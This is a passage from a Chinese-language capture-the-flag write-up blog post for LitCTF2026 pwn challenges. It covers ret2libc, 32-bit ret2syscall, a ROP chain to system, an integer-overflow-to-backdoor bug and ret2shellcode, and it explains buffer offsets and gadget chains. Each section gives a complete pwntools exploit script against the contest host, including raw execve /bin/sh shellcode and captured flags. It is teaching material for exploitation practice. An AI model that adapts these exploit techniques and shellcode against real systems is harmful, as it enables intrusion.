RET,</span><br><span class="line">    VULN,</span><br><span class="line">)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">line = io.recvline().strip()</span><br><span class="line">puts_addr = int(line.split(b&quot;0x&quot;)[1], 16)</span><br><span class="line">libc_base = puts_addr - PUTS_OFF</span><br><span class="line">system_addr = libc_base + SYSTEM_OFF</span><br><span class="line">binsh_addr = libc_base + BINSH_OFF</span><br><span class="line"></span><br><span class="line">print(f&quot;puts@libc = &#123;puts_addr:#x&#125;&quot;)</span><br><span class="line">print(f&quot;libc_base = &#123;libc_base:#x&#125;&quot;)</span><br><span class="line">print(f&quot;system    = &#123;system_addr:#x&#125;&quot;)</span><br><span class="line">print(f&quot;/bin/sh   = &#123;binsh_addr:#x&#125;&quot;)</span><br><span class="line"></span><br><span class="line">io.recvuntil(b&quot;Tell me your name: &quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = flat(</span><br><span class="line">    b&quot;A&quot; * OFFSET,</span><br><span class="line">    RET,</span><br><span class="line">    POP_RDI,</span><br><span class="line">    binsh_addr,</span><br><span class="line">    system_addr,</span><br><span class="line">)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">io.sendline(b&quot;cat /flag*&quot;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523182717023.png" alt="image-20260523182717023"></p>
+<p>flag为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;9gwslki3-1kh2-4hc-8gie-b19tdtdnqtsyr&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="LitCTF2026-lit-ret2syscall32"><a href="#LitCTF2026-lit-ret2syscall32" class="headerlink" title="[LitCTF2026] lit_ret2syscall32"></a>[LitCTF2026] lit_ret2syscall32</h3><p>题目描述：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这是一台32位的古老机器，没有 system()，没有 /bin/sh，连 libc 都沉默不语。</span><br><span class="line">但每一个程序都能向内核祈祷——通过中断门 int 0x80。</span><br><span class="line">你能唤醒这台机器最深层的系统调用之力吗？</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523183209636.png" alt="image-20260523183209636"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523183243288.png" alt="image-20260523183243288"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523183411982.png" alt="image-20260523183411982"></p>
+<p>buf只有 64 字节，但 read() 读了 0x200，存在标准栈溢出。<code>.data/.bss</code> 里还有一个可写的 <code>data_buf</code>。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523191849291.png" alt="image-20260523191849291"></p>
+<p>虽然 C 里写的是 <code>char buf[64]</code>，但编译后实际给这个缓冲区留了 <code>0x48</code> 字节栈空间。返回地址位于 <code>[ebp+4]</code>，因此覆盖返回地址的偏移是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x48 + 4 = 0x4c = 76</span><br></pre></td></tr></table></figure>
+
+<p>也就是说，前 76 字节用来填充，后面就是我们的 ROP 链。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523192009742.png" alt="image-20260523192009742"></p>
+<p>这些是构造链的关键。</p>
+<p>有了它们，就能把任意 4 字节内容写到指定内存，再触发系统调用。</p>
+<p>32 位 Linux 下，<code>execve</code> 的系统调用号是 <code>11</code>，也就是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eax = 11</span><br><span class="line">ebx = filename</span><br><span class="line">ecx = argv</span><br><span class="line">edx = envp</span><br></pre></td></tr></table></figure>
+
+<p>所以这题最终目标就是把寄存器摆成：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eax = 11</span><br><span class="line">ebx = data_buf            -&gt; &quot;/bin//sh\x00&quot;</span><br><span class="line">ecx = 0</span><br><span class="line">edx = 0</span><br></pre></td></tr></table></figure>
+
+<p>然后执行一次 <code>int 0x80</code>。</p>
+<p>程序里没有现成的 <code>/bin/sh</code> 字符串，所以要自己写。因为 <code>mov [edx], eax</code> 每次能写 4 字节，最方便的办法就是拆成三段：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data_buf     &lt;- &quot;/bin&quot;</span><br><span class="line">data_buf+4   &lt;- &quot;//sh&quot;</span><br><span class="line">data_buf+8   &lt;- &quot;\x00\x00\x00\x00&quot;</span><br></pre></td></tr></table></figure>
+
+<p>对应的ROP 思路如下：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pop edx ; ret      -&gt; edx = data_buf</span><br><span class="line">pop eax ; ret      -&gt; eax = &quot;/bin&quot;</span><br><span class="line">mov [edx], eax     -&gt; 写入前 4 字节</span><br><span class="line"></span><br><span class="line">pop edx ; ret      -&gt; edx = data_buf + 4</span><br><span class="line">pop eax ; ret      -&gt; eax = &quot;//sh&quot;</span><br><span class="line">mov [edx], eax     -&gt; 写入后 4 字节</span><br><span class="line"></span><br><span class="line">pop edx ; ret      -&gt; edx = data_buf + 8</span><br><span class="line">pop eax ; ret      -&gt; eax = 0</span><br><span class="line">mov [edx], eax     -&gt; 写入字符串结尾 0</span><br></pre></td></tr></table></figure>
+
+<p>之所以常写成 <code>&quot;/bin//sh&quot;</code> 而不是 <code>&quot;/bin/sh&quot;</code>，只是为了凑整 8 个字节，便于按 4 字节一组写入；Linux 会把它当成同一个路径处理。</p>
+<p>写完字符串以后，继续设置寄存器：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pop ecx ; pop ebx ; ret   -&gt; ecx = 0, ebx = data_buf</span><br><span class="line">pop edx ; ret             -&gt; edx = 0</span><br><span class="line">pop eax ; ret             -&gt; eax = 11</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+
+<p>注意这里虽然题目给了单独的 <code>pop ebx ; ret</code>，但用 <code>pop ecx ; pop ebx ; ret</code> 更省链长，因为 <code>execve</code> 本来就需要 <code>ecx = 0</code>。</p>
+<p>把前面的步骤合起来，最终 ROP 链结构就是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&quot;A&quot; * 76</span><br><span class="line">+ pop_edx</span><br><span class="line">+ data_buf</span><br><span class="line">+ pop_eax</span><br><span class="line">+ &quot;/bin&quot;</span><br><span class="line">+ mov_[edx]_eax</span><br><span class="line">+ pop_edx</span><br><span class="line">+ data_buf+4</span><br><span class="line">+ pop_eax</span><br><span class="line">+ &quot;//sh&quot;</span><br><span class="line">+ mov_[edx]_eax</span><br><span class="line">+ pop_edx</span><br><span class="line">+ data_buf+8</span><br><span class="line">+ pop_eax</span><br><span class="line">+ 0</span><br><span class="line">+ mov_[edx]_eax</span><br><span class="line">+ pop_ecx_ebx</span><br><span class="line">+ 0</span><br><span class="line">+ data_buf</span><br><span class="line">+ pop_edx</span><br><span class="line">+ 0</span><br><span class="line">+ pop_eax</span><br><span class="line">+ 11</span><br><span class="line">+ int_0x80</span><br></pre></td></tr></table></figure>
+
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./ret2syscall32&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;i386&quot;</span></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;challenge.cyclens.tech&quot;</span></span><br><span class="line">PORT = <span class="number">31342</span></span><br><span class="line"></span><br><span class="line">OFFSET = <span class="number">76</span></span><br><span class="line">DATA_BUF = elf.symbols[<span class="string">&quot;data_buf&quot;</span>]</span><br><span class="line"></span><br><span class="line">POP_EAX = elf.symbols[<span class="string">&quot;gadget_pop_eax&quot;</span>]</span><br><span class="line">POP_ECX_EBX = elf.symbols[<span class="string">&quot;gadget_pop_ecx_ebx&quot;</span>]</span><br><span class="line">POP_EDX = elf.symbols[<span class="string">&quot;gadget_pop_edx&quot;</span>]</span><br><span class="line">MOV_EDX_EAX = elf.symbols[<span class="string">&quot;gadget_mov_edx_eax&quot;</span>]</span><br><span class="line">INT_80 = elf.symbols[<span class="string">&quot;gadget_int_0x80&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    <span class="string">b&quot;A&quot;</span> * OFFSET,</span><br><span class="line">    POP_EDX, DATA_BUF,</span><br><span class="line">    POP_EAX, <span class="string">b&quot;/bin&quot;</span>,</span><br><span class="line">    MOV_EDX_EAX,</span><br><span class="line">    POP_EDX, DATA_BUF + <span class="number">4</span>,</span><br><span class="line">    POP_EAX, <span class="string">b&quot;//sh&quot;</span>,</span><br><span class="line">    MOV_EDX_EAX,</span><br><span class="line">    POP_EDX, DATA_BUF + <span class="number">8</span>,</span><br><span class="line">    POP_EAX, <span class="number">0</span>,</span><br><span class="line">    MOV_EDX_EAX,</span><br><span class="line">    POP_ECX_EBX, <span class="number">0</span>, DATA_BUF,</span><br><span class="line">    POP_EDX, <span class="number">0</span>,</span><br><span class="line">    POP_EAX, <span class="number">11</span>,</span><br><span class="line">    INT_80,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">io = remote(HOST, PORT)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Input: &quot;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.sendline(<span class="string">b&quot;cat /flag&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523192632775.png" alt="image-20260523192632775"></p>
+<p>flag为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;mvtqqyq0-hzhq-40w-8zsj-cuac2bvaunmyy&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="LitCTF2026-lit-ropchain"><a href="#LitCTF2026-lit-ropchain" class="headerlink" title="[LitCTF2026] lit_ropchain"></a>[LitCTF2026] lit_ropchain</h3><p>题目描述：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">程序里的碎片散落一地，没有现成的钥匙能打开 shell 之门。</span><br><span class="line">你需要像拼图大师一样，把一个个小小的代码碎片（gadgets）拼接起来，</span><br><span class="line">先读取 &quot;bin/sh&quot; 到内存，再召唤 system 之力。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523192845833.png" alt="image-20260523192845833"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523192854829.png" alt="image-20260523192854829"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523192900352.png" alt="image-20260523192900352"></p>
+<ol>
+<li><p><code>buf</code> 只有 64 字节，但 <code>read()</code> 读入了 <code>0x200</code>，是标准栈溢出。</p>
+</li>
+<li><p>程序故意内嵌了 <code>pop rdi</code>、<code>pop rsi</code>、<code>pop rdx</code>，等于把 ROP 需要的核心拼图直接送到了面前。</p>
+</li>
+<li><p>程序会引用 <code>system(&quot;echo hello&quot;)</code>，所以 ELF 里天然存在 <code>system@plt</code>，不需要泄露 libc 再 ret2libc。</p>
+<p><code>vuln()</code> 中缓冲区大小是 64 字节，保存的 <code>rbp</code> 是 8 字节，因此返回地址偏移就是：72</p>
+<p>也就是 payload 前面先填 <code>b&quot;A&quot; * 72</code> 即可覆盖 RIP。</p>
+</li>
+</ol>
+<p>整体思路非常直接：</p>
+<ol>
+<li>用 72 字节填充覆盖返回地址。</li>
+<li>ROP 调一次 <code>read(0, bss, 8)</code>，把 <code>&quot;/bin/sh\x00&quot;</code> 写到 <code>.bss</code>。</li>
+<li>再把 <code>rdi</code> 设成 <code>.bss</code> 地址，调用 <code>system@plt</code>。</li>
+</ol>
+<p>对应链子如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x27;A&#x27; * 72</span><br><span class="line">+ ret</span><br><span class="line">+ pop rdi ; ret</span><br><span class="line">+ 0</span><br><span class="line">+ pop rsi ; ret</span><br><span class="line">+ bss_addr</span><br><span class="line">+ pop rdx ; ret</span><br><span class="line">+ 8</span><br><span class="line">+ read@plt</span><br><span class="line">+ ret</span><br><span class="line">+ pop rdi ; ret</span><br><span class="line">+ bss_addr</span><br><span class="line">+ system@plt</span><br></pre></td></tr></table></figure>
+
+<p>脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.binary = elf = ELF(&quot;./ropchain&quot;)</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line"></span><br><span class="line">HOST = &quot;challenge.cyclens.tech&quot;</span><br><span class="line">PORT = 30137</span><br><span class="line"></span><br><span class="line">POP_RDI = 0x401166</span><br><span class="line">POP_RSI = 0x40116B</span><br><span class="line">POP_RDX = 0x401170</span><br><span class="line">RET = 0x40101A</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def build_payload():</span><br><span class="line">    bss = elf.symbols[&quot;bss_buf&quot;] + 0x80</span><br><span class="line">    return flat(</span><br><span class="line">        b&quot;A&quot; * 72,</span><br><span class="line">        RET,</span><br><span class="line">        POP_RDI,</span><br><span class="line">        0,</span><br><span class="line">        POP_RSI,</span><br><span class="line">        bss,</span><br><span class="line">        POP_RDX,</span><br><span class="line">        8,</span><br><span class="line">        elf.plt[&quot;read&quot;],</span><br><span class="line">        RET,</span><br><span class="line">        POP_RDI,</span><br><span class="line">        bss,</span><br><span class="line">        elf.plt[&quot;system&quot;],</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = remote(HOST, PORT)</span><br><span class="line">io.recvuntil(b&quot;Input: &quot;)</span><br><span class="line">io.send(build_payload())</span><br><span class="line">io.send(b&quot;/bin/sh\x00&quot;)</span><br><span class="line">io.sendline(b&quot;cat /flag&quot;)</span><br><span class="line">print(io.recvrepeat(2).decode())</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523193409889.png" alt="image-20260523193409889"></p>
+<p>flag为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ipoe9nnc-vgci-4gw-8g0h-a8sth6hobegiy&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="LitCTF2026-lit-integer-overflow"><a href="#LitCTF2026-lit-integer-overflow" class="headerlink" title="[LitCTF2026] lit_integer_overflow"></a>[LitCTF2026] lit_integer_overflow</h3><p>题目描述：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">程序说它会读取你指定长度的数据，但这个长度检查真的安全吗？</span><br><span class="line">当数学的边界被打破，栈上的秘密就将暴露无遗。</span><br><span class="line">听说程序里藏着一个神秘的后门，你能找到它吗？</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523193038810.png" alt="image-20260523193038810"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523193052644.png" alt="image-20260523193052644"></p>
+<ol>
+<li><code>size</code> 是有符号 <code>int</code>。</li>
+<li>程序虽然检查了 <code>size &gt;= 0 &amp;&amp; size &lt;= 63</code>，但即使不满足也照样继续执行 <code>read()</code>。</li>
+<li><code>read()</code> 的第三个参数被强转为 <code>unsigned int</code>，所以输入 <code>-1</code> 会变成 <code>0xffffffff</code>。</li>
+</ol>
+<p>这意味着只要输入负数，就能让 <code>read()</code> 向 <code>buf[64]</code> 里写入远超边界的数据，形成栈溢出。</p>
+<p>从符号表可以直接拿到后门地址：0x4011d7</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523193846122.png" alt="image-20260523193846122"></p>
+<p><code>read()</code> 实际写入的位置是 <code>[rbp-0x40]</code>，也就是一个 64 字节缓冲区。返回地址在 <code>[rbp+8]</code>，因此覆盖返回地址所需偏移是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x40 + 0x8 = 0x48 = 72</span><br></pre></td></tr></table></figure>
+
+<p> 先单独发送负数，触发超大读取，发送-1.</p>
+<p>程序会进入错误分支并打印：Invalid size! But I’ll still read it anyway…</p>
+<p>再单独发送payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = b&quot;A&quot; * 72 + p64(0x40101A) + p64(0x4011D7)</span><br></pre></td></tr></table></figure>
+
+<p><code>72</code> 是覆盖到返回地址的偏移。</p>
+<p><code>0x40101A</code> 是一个单独的 <code>ret</code> gadget，用来做栈对齐。</p>
+<p><code>0x4011D7</code> 是 <code>backdoor()</code> 地址。</p>
+<p>脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.binary = elf = ELF(&quot;./integer_overflow&quot;)</span><br><span class="line"></span><br><span class="line">HOST = &quot;challenge.cyclens.tech&quot;</span><br><span class="line">PORT = 31757</span><br><span class="line"></span><br><span class="line">OFFSET = 72</span><br><span class="line">RET = 0x40101A</span><br><span class="line">BACKDOOR = elf.symbols[&quot;backdoor&quot;]</span><br><span class="line"></span><br><span class="line">io = remote(HOST, PORT)</span><br><span class="line">io.recvuntil(b&quot;(0-63): &quot;)</span><br><span class="line">io.sendline(b&quot;-1&quot;)</span><br><span class="line">io.recvuntil(b&quot;Invalid size! But I&#x27;ll still read it anyway...\n&quot;)</span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    b&quot;A&quot; * OFFSET,</span><br><span class="line">    RET,</span><br><span class="line">    BACKDOOR,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523194257299.png" alt="image-20260523194257299"></p>
+<p>flag为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;egw6xmta-mae1-4ko-8jop-6bt7ffxx6c6ap&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="LitCTF2026-lit-ret2shellcode"><a href="#LitCTF2026-lit-ret2shellcode" class="headerlink" title="[LitCTF2026] lit_ret2shellcode"></a>[LitCTF2026] lit_ret2shellcode</h3><p>题目描述：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这是一个古老的工坊，工匠们在这里直接在栈上刻写代码。</span><br><span class="line">传说栈上的墨迹还未干涸，代码就能直接运行。</span><br><span class="line">你能在这块可执行的栈上写下属于你的咒语，并让它执行吗？</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523191046241.png" alt="image-20260523191046241"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523191243569.png" alt="image-20260523191243569"></p>
+<p>程序在 <code>vuln()</code> 中定义了一个栈缓冲区。</p>
+<p>随后直接：read(0, buf, 0x200);</p>
+<p>这会把最多 <code>0x200</code> 字节写进只有 100 字节的缓冲区，造成经典栈溢出。</p>
+<p>同时程序还主动泄露了栈上 <code>buf</code> 的地址。printf(“Here is a hint for you: buf is at %p\n”, buf);</p>
+<p>因此利用链非常直接：</p>
+<ol>
+<li><p>读取程序输出，拿到 <code>buf</code> 地址。</p>
+</li>
+<li><p>将 amd64 shellcode 写入 <code>buf</code>。</p>
+</li>
+<li><p>用填充覆盖到返回地址。</p>
+</li>
+<li><p>将返回地址改成泄露出的 <code>buf</code> 地址。</p>
+</li>
+<li><p>函数返回后跳到栈上执行 shellcode，拿到 shell。</p>
+<p>payload:payload &#x3D; shellcode.ljust(120, b”A”) + p64(buf_addr)</p>
+<p>脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = &quot;challenge.cyclens.tech&quot;</span><br><span class="line">PORT = 32232</span><br><span class="line">BIN_PATH = &quot;./ret2shellcode&quot;</span><br><span class="line">OFFSET = 120</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SHELLCODE = bytes.fromhex(</span><br><span class="line">    &quot;4831f65648bf2f62696e2f2f736857545f6a3b58990f05&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start():</span><br><span class="line">    if len(sys.argv) &gt; 1 and sys.argv[1] == &quot;local&quot;:</span><br><span class="line">        return process(BIN_PATH)</span><br><span class="line">    return remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def build_payload(buf_addr: int) -&gt; bytes:</span><br><span class="line">    return SHELLCODE.ljust(OFFSET, b&quot;A&quot;) + p64(buf_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    context.clear(arch=&quot;amd64&quot;, os=&quot;linux&quot;)</span><br><span class="line">    io = start()</span><br><span class="line"></span><br><span class="line">    io.recvuntil(b&quot;buf is at &quot;)</span><br><span class="line">    buf_addr = int(io.recvline().strip(), 16)</span><br><span class="line">    io.recvuntil(b&quot;Leave your mark on the stack: &quot;)</span><br><span class="line"></span><br><span class="line">    payload = build_payload(buf_addr)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    sleep(0.2)</span><br><span class="line">    io.sendline(b&quot;cat /flag || cat /flag.txt || cat /app/flag*&quot;)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523190106384.png" alt="image-20260523190106384"></p>
+</li>
+</ol>
+<p>flag为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;i6mbkmak-lg2l-4zy-8jdy-srdzelt2wshre&#125;</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://simple9656.github.io">joke</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://simple9656.github.io/2026/05/25/LitCTF-Writeup/">https://simple9656.github.io/2026/05/25/LitCTF-Writeup/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://simple9656.github.io" target="_blank">joke的小世界</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a><a class="post-meta__tags" href="/tags/LitCTF/">LitCTF</a></div><div class="post-share"><div class="social-share" data-image="https://picsum.photos/1920/1080?random=1" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/04/07/QingCenCTF%20%E5%88%B7%E9%A2%98writeup/" title="QingCenCTF 刷题writeup"><img class="cover" src="https://picsum.photos/1920/1080?random=3" 